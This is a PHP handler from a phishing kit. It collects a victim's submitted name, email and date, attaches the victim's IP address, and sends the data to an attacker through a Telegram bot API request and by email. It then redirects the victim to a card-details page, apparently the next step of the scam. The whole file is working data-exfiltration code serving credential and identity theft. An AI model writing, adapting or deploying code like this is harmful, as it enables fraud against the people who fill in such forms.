<?php
$root = getenv("REMOTE_ADDR");
require('../main.php');
$message .= "
 ------- INFO $ip 🇩🇰🇩🇰 ------
 [NAME] : ".$_POST['ab1']."
 [EMAIL] : ".$_POST['ab2']."
 [DATE] : ".$_POST['ab3']."
----- [   P   A   N   E  L   ] -----
$panel
----------[ IP API  ]-------
ip-api.com/$ip
\n";
$url='https://api.telegram.org/bot'.$telegrambot.'/sendMessage';$data=array('chat_id'=>$telegramchatid,'text'=>$message);
$options=array('http'=>array('method'=>'POST','header'=>"Content-Type:application/x-www-form-urlencoded\r\n",'content'=>http_build_query($data),),);
$context=stream_context_create($options);
$result=file_get_contents($url,false,$context);
mail($email,$subject,$message);

$xxx = base64_encode(time().sha1($_SERVER['REMOTE_ADDR'].$_SERVER['HTTP_USER_AGENT']).md5(uniqid(rand(), true)));
header("Location: ./card.php?$xxx");
?>